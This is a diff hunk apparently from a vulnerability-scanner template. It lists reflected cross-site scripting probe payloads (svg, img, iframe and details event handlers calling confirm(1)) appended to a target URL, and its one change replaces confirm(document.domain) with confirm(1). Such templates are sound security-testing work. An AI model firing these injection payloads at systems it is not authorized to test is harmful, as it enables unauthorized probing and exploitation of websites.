@@ -18,7 +18,7 @@ requests:
       - "{{BaseURL}}'><details/open/ontoggle=confirm(1)>"
       - "{{BaseURL}}'><svg><circle><set onbegin=confirm(1) attributename=fill>"
       - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
-      - "{{BaseURL}}'</script><img src=x onerror=confirm(document.domain)>"
+      - "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
       - "{{BaseURL}}'<iframe/onload=confirm(1)>"
 
     matchers-condition: and
